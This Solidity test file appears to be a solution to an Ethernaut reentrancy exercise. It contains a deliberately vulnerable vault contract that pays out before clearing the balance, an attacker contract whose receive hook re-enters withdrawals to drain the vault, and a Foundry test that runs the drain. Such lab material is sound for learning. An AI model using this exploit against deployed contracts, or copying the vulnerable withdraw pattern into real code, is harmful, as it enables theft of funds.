// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

contract Reentrance {

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdrawAll() public {
        (bool result,) = msg.sender.call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

contract Hack {
    Reentrance vault;

    constructor(address _vault) {
        vault = Reentrance(payable(_vault));
    }


    function donate_to_vault() external payable {
        vault.donate{value: msg.value}(address(this));
    }

    function withdraw() external {
        vault.withdrawAll();
    }

    function drain() external {
        payable(msg.sender).call{value: address(this).balance}("");
    }
    
    receive() external payable {
        if (address(vault).balance != 0) {
            vault.withdrawAll();
        }
    }
 }

contract EthernautTest is Test {
    Reentrance vault;
    address me = 0xB9f16b5a5D773be3Ec4A383dbc7316a515430605;

    function setUp() public {
        
        vault = new Reentrance();

    }

    function test_1() public {

       payable(vault).call{value: 100 ether}("");

        vm.startPrank(me);

        vm.deal(me, 100 ether);

        console2.log(me.balance);
        console2.log(address(vault).balance);

        Hack h = new Hack(address(vault));

        h.donate_to_vault{value: 20 ether}();

        h.withdraw();

        h.drain();

        console2.log(me.balance);
        console2.log(address(vault).balance);

        vm.stopPrank();

    }
}
